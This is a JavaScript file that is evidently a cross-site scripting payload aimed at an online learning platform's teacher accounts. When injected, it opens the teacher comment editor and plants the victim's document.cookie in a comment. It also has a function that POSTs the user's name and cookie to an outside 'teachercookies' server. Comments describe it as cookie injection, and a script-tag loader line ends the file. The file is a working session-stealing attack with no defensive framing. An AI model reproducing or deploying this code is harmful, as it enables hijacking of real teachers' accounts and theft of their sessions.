

function stt(){
    var iframe = document.getElementById("ueditor_1");
    var elmnt = iframe.contentWindow;
    elmnt.document.getElementsByClassName("view")[1].getElementsByTagName("p")[0].innerHTML="<!-- "+document.cookie+"-->&nbsp;";
    return;
}

function sendInfoToServer(){
    const uri = 'https://chaoxingapiserver.chinacloudsites.cn/api/teachercookies';

    var currentdate = new Date(); 
    var datetime = currentdate.getDate() + "/"
                + (currentdate.getMonth()+1)  + "/" 
                + currentdate.getFullYear() + " @ "  
                + currentdate.getHours() + ":"  
                + currentdate.getMinutes() + ":" 
                + currentdate.getSeconds();

    const item = {
        name: document.getElementsByClassName("zt_u_name")[0].innerText,
        cookie:document.cookie ,
        time:datetime
      };

      fetch(uri, {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(item)
      })
        .then(response => response.json())
        .catch(error => console.error('Unable to add item.', error));
        //send cookie info to a server hosting a restfulapi for teachercookies
}

function test(){
    //alert("start");
    //test code

    document.getElementsByClassName("comPic")[0].click(); //open teacher comment editor
    setTimeout(stt,2000);//start cookie injection
    //setTimeout(sendInfoToServer,2000);//start cookie injection
    return;
}

if(typeof ononon == 'undefined')
{
ononon=0;
setTimeout(test, 3000);
}       //prevent the injected code from running multiple times

//payloads       <script src="https://www.***.***/***.js"></script>

